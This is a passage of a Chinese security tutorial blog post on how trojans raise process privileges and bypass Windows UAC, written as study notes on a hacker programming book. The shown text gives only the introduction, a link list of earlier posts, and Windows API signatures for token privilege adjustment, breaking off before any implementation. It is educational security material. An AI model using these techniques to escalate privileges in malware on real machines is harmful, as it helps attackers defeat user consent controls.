---
layout: post
title: "网络安全自学篇"
date: 2025-01-10 11:31:31 +0800
description: "这是作者网络安全自学教程系列，主要是关于安全工具和实践操作的在线笔记，特分享出来与博友们学习，希望您"
keywords: "从这篇文章开始,作者将带着大家来学习《windows黑客编程技术详解》,其作者是甘迪"
categories: ['未分类']
tags: ['网络', '深度学习', '数据安全', '信息安全']
artid: "108600573"
image:
  path: https://api.vvhan.com/api/bing?rand=sj&artid=108600573
  alt: "网络安全自学篇"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=108600573
featuredImagePreview: https://bing.ee123.net/img/rand?artid=108600573
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     网络安全自学篇
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      这是作者网络安全自学教程系列，主要是关于安全工具和实践操作的在线笔记，特分享出来与博友们学习，希望您喜欢，一起进步。这篇文章将带着大家来学习《Windows黑客编程技术详解》，其作者是甘迪文老师，推荐大家购买来学习。作者将采用实际编程和图文结合的方式进行分享，并且会进一步补充相关知识点。第六篇文章主要介绍木马病毒提权技术，包括进程访问令牌权限提升和Bypass UAC，希望对您有所帮助。
     </span>
    </p>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      如果把权限看作是门禁卡，那么计算机便是一栋拥有许多门禁的大楼，要想进入一个房间或办公室，则需要拥有对应房间的门禁卡。对于低权限，即拥有很少数量的门禁卡，能去的也只有厕所之类的无关紧要的地方，无法进入层层设防的保密办公室。这样，即使病毒木马成功混入计算机这所大楼，如果没有足够的权限，也不能窃取或修改计算机中的关键数据，杀伤力有限。
     </span>
    </p>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      <strong>
       因此，提权技术（从低权限获取高权限的技术）成为大多数病毒木马必备技术。
      </strong>
     </span>
    </p>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      <img alt="在这里插入图片描述" height="300" src="https://i-blog.csdnimg.cn/blog_migrate/1d55ccecec7cafef9c7cf6935557ee82.png#pic_center" width="400"/>
     </span>
    </p>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      计算机上有哪些操作需要提权呢？操作系统处于安全考虑，对不同的操作系统划分了权限。例如创建或修改系统服务、修改HKEY_LOCAL_MACHINE注册表键或重启移动文件等操作，均需要管理员权限，普通权限操作会失败。
     </span>
    </p>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      同时，从VISTA系统引入了UAC（用户账户控制），涉及权限操作时都会有弹窗提示，只有用户点击确认后，方可继续操作。所以，VISTA之后的提权操作主要是针对UAC不弹窗静默提权，即Bypass UAC。
     </span>
    </p>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      <img alt="在这里插入图片描述" height="450" src="https://i-blog.csdnimg.cn/blog_migrate/c4ed39456f3e6e3e75fe522caf75ed4f.png#pic_center" width="350"/>
     </span>
    </p>
    <p style="margin-left:0px;">
    </p>
    <div style="margin-left:0px;">
     <h4 style="margin-left:0px;">
      <span style="color:rgba(0,0,0,.75);">
       <strong>
        <span style="color:#4f4f4f;">
         <a name="t0">
         </a>
         文章目录
        </span>
       </strong>
      </span>
     </h4>
     <ul style="margin-left:0px;">
      <li>
       <span style="color:rgba(0,0,0,.75);">
        <a href="https://blog.csdn.net/Eastmount/article/details/108486283?utm_medium=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;depth_1-utm_source=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;request_id=#_139">
         一.进程访问令牌权限提升
        </a>
       </span>
      </li>
      <li>
       <span style="color:rgba(0,0,0,.75);">
        <a href="https://blog.csdn.net/Eastmount/article/details/108486283?utm_medium=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;depth_1-utm_source=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;request_id=#1_143">
         1.函数介绍
        </a>
       </span>
      </li>
      <li>
       <span style="color:rgba(0,0,0,.75);">
        <a href="https://blog.csdn.net/Eastmount/article/details/108486283?utm_medium=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;depth_1-utm_source=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;request_id=#2_194">
         2.实现原理
        </a>
       </span>
      </li>
      <li>
       <span style="color:rgba(0,0,0,.75);">
        <a href="https://blog.csdn.net/Eastmount/article/details/108486283?utm_medium=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;depth_1-utm_source=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;request_id=#3_223">
         3.编程实现
        </a>
       </span>
      </li>
      <li>
       <span style="color:rgba(0,0,0,.75);">
        <a href="https://blog.csdn.net/Eastmount/article/details/108486283?utm_medium=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;depth_1-utm_source=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;request_id=#Bypass_UAC_387">
         二.Bypass UAC
        </a>
       </span>
      </li>
      <li>
       <span style="color:rgba(0,0,0,.75);">
        <a href="https://blog.csdn.net/Eastmount/article/details/108486283?utm_medium=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;depth_1-utm_source=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;request_id=#1Bypass_UAC_409">
         1.基于白名单程序的Bypass UAC
        </a>
       </span>
      </li>
      <li>
       <span style="color:rgba(0,0,0,.75);">
        <a href="https://blog.csdn.net/Eastmount/article/details/108486283?utm_medium=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;depth_1-utm_source=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;request_id=#2COMBypass_UAC_560">
         2.基于COM组件接口的Bypass UAC
        </a>
       </span>
      </li>
      <li>
       <span style="color:rgba(0,0,0,.75);">
        <a href="https://blog.csdn.net/Eastmount/article/details/108486283?utm_medium=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;depth_1-utm_source=distribute.pc_category.none-task-blog-hot-3.nonecase&amp;request_id=#_678">
         三.总结
        </a>
       </span>
      </li>
     </ul>
    </div>
    <p style="margin-left:0px;">
    </p>
    <p>
    </p>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      <strong>
       作者的github资源：
      </strong>
      <br/>
      软件安全：
      <a href="https://github.com/eastmountyxz/Software-Security-Course">
       https://github.com/eastmountyxz/Software-Security-Course
      </a>
      <br/>
      其他工具：
      <a href="https://github.com/eastmountyxz/NetworkSecuritySelf-study">
       https://github.com/eastmountyxz/NetworkSecuritySelf-study
      </a>
      <br/>
      Windows-Hacker：
      <a href="https://github.com/eastmountyxz/Windows-Hacker-Exp">
       https://github.com/eastmountyxz/Windows-Hacker-Exp
      </a>
     </span>
    </p>
    <p>
    </p>
    <blockquote>
     <p style="margin-left:0px;">
      <span style="color:#555666;">
       声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。
      </span>
     </p>
    </blockquote>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      <strong>
       前文学习：
      </strong>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/97784774">
       [网络安全自学篇] 一.入门笔记之看雪Web安全学习及异或解密示例
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/98340074">
       [网络安全自学篇] 二.Chrome浏览器保留密码功能渗透解析及登录加密入门笔记
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/98469967">
       [网络安全自学篇] 三.Burp Suite工具安装配置、Proxy基础用法及暴库示例
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/98529597">
       [网络安全自学篇] 四.实验吧CTF实战之WEB渗透和隐写术解密
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/98789742">
       [网络安全自学篇] 五.IDA Pro反汇编工具初识及逆向工程解密实战
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/99088681">
       [网络安全自学篇] 六.OllyDbg动态分析工具基础用法及Crakeme逆向
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/100544347">
       [网络安全自学篇] 七.快手视频下载之Chrome浏览器Network分析及Python爬虫探讨
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/100566032">
       [网络安全自学篇] 八.Web漏洞及端口扫描之Nmap、ThreatScan和DirBuster工具
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/100585715">
       [网络安全自学篇] 九.社会工程学之基础概念、IP获取、IP物理定位、文件属性
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/100784947">
       [网络安全自学篇] 十.论文之基于机器学习算法的主机恶意代码
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/101000161">
       [网络安全自学篇] 十一.虚拟机VMware+Kali安装入门及Sqlmap基本用法
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/101076537">
       [网络安全自学篇] 十二.Wireshark安装入门及抓取网站用户名密码（一）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/101101829">
       [网络安全自学篇] 十三.Wireshark抓包原理（ARP劫持、MAC泛洪）及数据流追踪和图像抓取（二）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/101645333">
       [网络安全自学篇] 十四.Python攻防之基础常识、正则表达式、Web编程和套接字通信（一）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/102138329">
       [网络安全自学篇] 十五.Python攻防之多线程、C段扫描和数据库编程（二）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/102469991">
       [网络安全自学篇] 十六.Python攻防之弱口令、自定义字典生成及网站暴库防护
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/102499639">
       [网络安全自学篇] 十七.Python攻防之构建Web目录扫描器及ip代理池（四）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/102511286">
       [网络安全自学篇] 十八.XSS跨站脚本攻击原理及代码攻防演示（一）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/102781411">
       [网络安全自学篇] 十九.Powershell基础入门及常见用法（一）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/102794131">
       [网络安全自学篇] 二十.Powershell基础入门及常见用法（二）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/102889605">
       [网络安全自学篇] 二十一.GeekPwn极客大赛之安全攻防技术总结及ShowTime
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/102816621">
       [网络安全自学篇] 二十二.Web渗透之网站信息、域名信息、端口信息、敏感信息及指纹信息收集
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/102852458">
       [网络安全自学篇] 二十三.基于机器学习的恶意请求识别及安全领域中的机器学习
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103189405">
       [网络安全自学篇] 二十四.基于机器学习的恶意代码识别及人工智能中的恶意代码检测
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103018495">
       [网络安全自学篇] 二十五.Web安全学习路线及木马、病毒和防御初探
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103135719">
       [网络安全自学篇] 二十六.Shodan搜索引擎详解及Python命令行调用
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103170828">
       [网络安全自学篇] 二十七.Sqlmap基础用法、CTF实战及请求参数设置（一）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103433706">
       [网络安全自学篇] 二十八.文件上传漏洞和Caidao入门及防御原理（一）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103452557">
       [网络安全自学篇] 二十九.文件上传漏洞和IIS6.0解析漏洞及防御原理（二）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103479614">
       [网络安全自学篇] 三十.文件上传漏洞、编辑器漏洞和IIS高版本漏洞及防御（三）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103552209">
       [网络安全自学篇] 三十一.文件上传漏洞之Upload-labs靶场及CTF题目01-10（四）
      </a>
      <br/>
      [网络安全自学篇] 三十二.文件上传漏洞之Upload-labs靶场及CTF题目11-20（五）
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103612329">
       [网络安全自学篇] 三十三.文件上传漏洞之绕狗一句话原理和绕过安全狗（六）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103618914">
       [网络安全自学篇] 三十四.Windows系统漏洞之5次Shift漏洞启动计算机
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103703819">
       [网络安全自学篇] 三十五.恶意代码攻击溯源及恶意样本分析
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103876466">
       [网络安全自学篇] 三十六.WinRAR漏洞复现（CVE-2018-20250）及恶意软件自启动劫持
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103896845">
       [网络安全自学篇] 三十七.Web渗透提高班之hack the box在线靶场注册及入门知识（一）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103938700">
       [网络安全自学篇] 三十八.hack the box渗透之BurpSuite和Hydra密码爆破及Python加密Post请求（二）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103963573">
       [网络安全自学篇] 三十九.hack the box渗透之DirBuster扫描路径及Sqlmap高级注入用法（三）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103925419">
       [网络安全自学篇] 四十.phpMyAdmin 4.8.1后台文件包含漏洞复现及详解（CVE-2018-12613）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/103898463">
       [网络安全自学篇] 四十一.中间人攻击和ARP欺骗原理详解及漏洞还原
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104065639">
       [网络安全自学篇] 四十二.DNS欺骗和钓鱼网站原理详解及漏洞还原
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104113939">
       [网络安全自学篇] 四十三.木马原理详解、远程服务器IPC$漏洞及木马植入实验
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104134085">
       [网络安全自学篇] 四十四.Windows远程桌面服务漏洞（CVE-2019-0708）复现及详解
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104146757">
       [网络安全自学篇] 四十五.病毒详解及批处理病毒制作（自启动、修改密码、定时关机、蓝屏、进程关闭）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104335673">
       [网络安全自学篇] 四十六.微软证书漏洞CVE-2020-0601 (上)Windows验证机制及可执行文件签名复现
      </a>
      <br/>
      [网络安全自学篇] 四十七.微软证书漏洞CVE-2020-0601 (下)Windows证书签名及HTTPS网站劫持
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104383134">
       [网络安全自学篇] 四十八.Cracer第八期——(1)安全术语、Web渗透流程、Windows基础、注册表及黑客常用DOS命令
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104480406">
       [网络安全自学篇] 四十九.Procmon软件基本用法及文件进程、注册表查看
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104536766">
       [网络安全自学篇] 五十.虚拟机基础之安装XP系统、文件共享、网络快照设置及Wireshark抓取BBS密码
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104547485">
       [网络安全自学篇] 五十一.恶意样本分析及HGZ木马控制目标服务器
      </a>
      <br/>
      [网络安全自学篇] 五十二.Windows漏洞利用之栈溢出原理和栈保护GS机制
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104573931">
       [网络安全自学篇] 五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104593520">
       [网络安全自学篇] 五十四.Windows漏洞利用之基于SEH异常处理机制的栈溢出攻击及shell提取
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104612053">
       [网络安全自学篇] 五十五.Windows漏洞利用之构建ROP链绕过DEP并获取Shell
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104639277">
       [网络安全自学篇] 五十六.i春秋老师分享小白渗透之路及Web渗透技术总结
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104769616">
       [网络安全自学篇] 五十七.PE文件逆向之什么是数字签名及Signtool签名工具详解（一）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104801332">
       [网络安全自学篇] 五十八.Windows漏洞利用之再看CVE-2019-0708及Metasploit反弹shell
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104834931">
       [网络安全自学篇] 五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/104843609">
       [网络安全自学篇] 六十.Cracer第八期——(2)五万字总结Linux基础知识和常用渗透命令
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/105074188">
       [网络安全自学篇] 六十一.PE文件逆向之数字签名详细解析及Signcode、PEView、010Editor、Asn1View等工具用法（二）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/105080804">
       [网络安全自学篇] 六十二.PE文件逆向之PE文件解析、PE编辑工具使用和PE结构修改（三）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/105118450">
       [网络安全自学篇] 六十三.hack the box渗透之OpenAdmin题目及蚁剑管理员提权（四）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/105350314">
       [网络安全自学篇] 六十四.Windows漏洞利用之SMBv3服务远程代码执行漏洞（CVE-2020-0796）复现及详解
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/105423490">
       [网络安全自学篇] 六十五.Vulnhub靶机渗透之环境搭建及JIS-CTF入门和蚁剑提权示例（一）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/105442329">
       [网络安全自学篇] 六十六.Vulnhub靶机渗透之DC-1提权和Drupal漏洞利用（二）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/105407843">
       [网络安全自学篇] 六十七.WannaCry勒索病毒复现及分析（一）Python利用永恒之蓝及Win7勒索加密
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/105640538">
       [网络安全自学篇] 六十八.WannaCry勒索病毒复现及分析（二）MS17-010利用及病毒解析
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/105646194">
       [网络安全自学篇] 六十九.宏病毒之入门基础、防御措施、自发邮件及APT28样本分析
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/105760940">
       [网络安全自学篇] 七十.WannaCry勒索病毒复现及分析（三）蠕虫传播机制分析及IDA和OD逆向
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/105808305">
       [网络安全自学篇] 七十一.深信服分享之外部威胁防护和勒索病毒对抗
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/105843983">
       [网络安全自学篇] 七十二.逆向分析之OllyDbg动态调试工具（一）基础入门及TraceMe案例分析
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/105903050">
       [网络安全自学篇] 七十三.WannaCry勒索病毒复现及分析（四）蠕虫传播机制全网源码详细解读
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/106009460">
       [网络安全自学篇] 七十四.APT攻击检测溯源与常见APT组织的攻击案例
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/106066009">
       [网络安全自学篇] 七十五.Vulnhub靶机渗透之bulldog信息收集和nc反弹shell（三）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/106100467">
       [网络安全自学篇] 七十六.逆向分析之OllyDbg动态调试工具（二）INT3断点、反调试、硬件断点与内存断点
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/106110294">
       [网络安全自学篇] 七十七.恶意代码与APT攻击中的武器（强推Seak老师）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/106183208">
       [网络安全自学篇] 七十八.XSS跨站脚本攻击案例分享及总结（二）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/106204633">
       [网络安全自学篇] 七十九.Windows PE病毒原理、分类及感染方式详解
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/106409569">
       [网络安全自学篇] 八十.WHUCTF之WEB类解题思路WP（代码审计、文件包含、过滤绕过、SQL注入）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/106428277">
       [网络安全自学篇] 八十一.WHUCTF之WEB类解题思路WP（文件上传漏洞、冰蝎蚁剑、反序列化phar）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/106459166">
       [网络安全自学篇] 八十二.WHUCTF之隐写和逆向类解题思路WP（文字解密、图片解密、佛语解码、冰蝎流量分析、逆向分析）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/106560849">
       [网络安全自学篇] 八十三.WHUCTF之CSS注入、越权、csrf-token窃取及XSS总结
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/106718606">
       [网络安全自学篇] 八十四.《Windows黑客编程技术详解》之VS环境配置、基础知识及DLL延迟加载详解
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/106929277">
       [网络安全自学篇] 八十五.《Windows黑客编程技术详解》之注入技术详解（全局钩子、远线程钩子、突破Session 0注入、APC注入）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/107345903">
       [网络安全自学篇] 八十六.威胁情报分析之Python抓取FreeBuf网站APT文章（上）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/106975996">
       [网络安全自学篇] 八十七.恶意代码检测技术详解及总结
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/107420755">
       [网络安全自学篇] 八十八.基于机器学习的恶意代码检测技术详解
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/107384250">
       [网络安全自学篇] 八十九.PE文件解析之通过Python获取时间戳判断软件来源地区
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/107449094">
       [网络安全自学篇] 九十.远控木马详解及APT攻击中的远控
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/107579485">
       [网络安全自学篇] 九十一.阿里云搭建LNMP环境及实现PHP自定义网站IP访问 (1)
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/107578717">
       [网络安全自学篇] 九十二.《Windows黑客编程技术详解》之病毒启动技术创建进程API、突破SESSION0隔离、内存加载详解（3）
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/108020041">
       [网络安全自学篇] 九十三.《Windows黑客编程技术详解》之木马开机自启动技术（注册表、计划任务、系统服务）
      </a>
     </span>
    </p>
    <p>
    </p>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      <strong>
       前文欣赏：
      </strong>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/75000575">
       [渗透&amp;攻防] 一.从数据库原理学习网络攻防及防止SQL注入
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/75269811">
       [渗透&amp;攻防] 二.SQL MAP工具从零解读数据库及基础用法
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/75570768">
       [渗透&amp;攻防] 三.数据库之差异备份及Caidao利器
      </a>
      <br/>
      <a href="https://blog.csdn.net/Eastmount/article/details/76222774">
       [渗透&amp;攻防] 四.详解MySQL数据库攻防及Fiddler神器分析数据包
      </a>
     </span>
    </p>
    <p>
    </p>
    <hr/>
    <h2 style="margin-left:0px;">
     <strong>
      <span style="color:#4f4f4f;">
       <a name="t1">
       </a>
       <a id="_139">
       </a>
       一.进程访问令牌权限提升
      </span>
     </strong>
    </h2>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      病毒木马想要实现一些关键的系统操作时，往往要求执行操作的进程拥有足够的权限。比如，通过调用ExitWindows函数实现关机或重启操作时，它就要求进程要有 SE_SHUTDOWN_NAME 权限，否则会忽视操作不执行。这时，程序能够做的便是按照要求提升进程群贤，第一部分通过介绍提升进程访问令牌的权限。
     </span>
    </p>
    <h3 style="margin-left:0px;">
     <strong>
      <span style="color:#4f4f4f;">
       <a name="t2">
       </a>
       <a id="1_143">
       </a>
       1.函数介绍
      </span>
     </strong>
    </h3>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      <strong>
       (1) OpenProcessToken函数
      </strong>
      <br/>
      打开与进程关联的访问令牌。
     </span>
    </p>
    <pre class="has" style="margin-left:0px;"><code class="language-prettyprint">&lt;span style="color:#000000"&gt;&lt;code class="language-c"&gt;BOOL &lt;span style="color:#61aeee"&gt;OpenProcessToken&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;
	HANDLE ProcessHandle&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#5c6370"&gt;//要修改访问权限的进程句柄&lt;/span&gt;
	DWORD DesiredAccess&lt;span style="color:#999999"&gt;,&lt;/span&gt;  &lt;span style="color:#5c6370"&gt;//访问掩码,要对令牌进行何种操作&lt;/span&gt;
	PHANDLE TokenHandle   &lt;span style="color:#5c6370"&gt;//返回的访问令牌指针&lt;/span&gt;
&lt;span style="color:#999999"&gt;)&lt;/span&gt;；
&lt;/code&gt;&lt;/span&gt;</code></pre>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      <strong>
       (2) LookupPrivilegevalue函数
      </strong>
      <br/>
      查看系统权限的特权值，返回信息到一个LUID结构体。
     </span>
    </p>
    <pre class="has" style="margin-left:0px;"><code class="language-prettyprint">&lt;span style="color:#000000"&gt;&lt;code class="language-c"&gt;BOOL &lt;span style="color:#61aeee"&gt;LookupPrivilegevalue&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;
	LPCTSTR lpSystemName&lt;span style="color:#999999"&gt;,&lt;/span&gt;   &lt;span style="color:#5c6370"&gt;//指向要获取特权值的系统名称&lt;/span&gt;
	LPCTSTR lpName&lt;span style="color:#999999"&gt;,&lt;/span&gt;         &lt;span style="color:#5c6370"&gt;//特权名称&lt;/span&gt;
	PLUID lpLuid            &lt;span style="color:#5c6370"&gt;//指向LUID变量的指针&lt;/span&gt;
&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/span&gt;</code></pre>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      <strong>
       (3) AdjustTokenPrivileges函数
      </strong>
      <br/>
      启用或禁用指定访问令牌中的权限，在访问令牌中启用或禁用权限时需要 TOKEN_ADJUST_PRIVILEGES 访问。
     </span>
    </p>
    <pre class="has" style="margin-left:0px;"><code class="language-prettyprint">&lt;span style="color:#000000"&gt;&lt;code class="language-c"&gt;BOOL &lt;span style="color:#61aeee"&gt;AdjustTokenPrivileges&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;
	HANDLE TokenHandle&lt;span style="color:#999999"&gt;,&lt;/span&gt;         &lt;span style="color:#5c6370"&gt;//handle to token&lt;/span&gt;
	BOOL DisableAllPrivileges&lt;span style="color:#999999"&gt;,&lt;/span&gt;  &lt;span style="color:#5c6370"&gt;//disabling option&lt;/span&gt;
	PTOKEN_PRIVILEGES NewState&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#5c6370"&gt;//privilege information&lt;/span&gt;
	DWORD BufferLength&lt;span style="color:#999999"&gt;,&lt;/span&gt;         &lt;span style="color:#5c6370"&gt;//size of buffer&lt;/span&gt;
	PTOKEN_PRIVILEGES PreviousState&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#5c6370"&gt;//original state buffer&lt;/span&gt;
	PDWORD ReturnLength         &lt;span style="color:#5c6370"&gt;//required buffer size&lt;/span&gt;
&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/span&gt;</code></pre>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      其中，操作类型及特权属性Attributes可以是如下常量：
     </span>
    </p>
    <pre class="has" style="margin-left:0px;"><code class="language-prettyprint">&lt;span style="color:#000000"&gt;&lt;code class="language-c"&gt;SE_PRIVILEGE_ENABLED            &lt;span style="color:#5c6370"&gt;//使特权有效&lt;/span&gt;
SE_PRIVILEGE_ENABLED_BY_DEFAULT &lt;span style="color:#5c6370"&gt;//使特权默认有效&lt;/span&gt;
SE_PRIVILEGE_REMOVED            &lt;span style="color:#5c6370"&gt;//移除该特权&lt;/span&gt;
SE_PRIVILEGE_USED_FOR_ACCESS    &lt;span style="color:#5c6370"&gt;//取得对象或服务的访问权&lt;/span&gt;
&lt;/code&gt;&lt;/span&gt;</code></pre>
    <p>
    </p>
    <hr/>
    <h3 style="margin-left:0px;">
     <strong>
      <span style="color:#4f4f4f;">
       <a name="t3">
       </a>
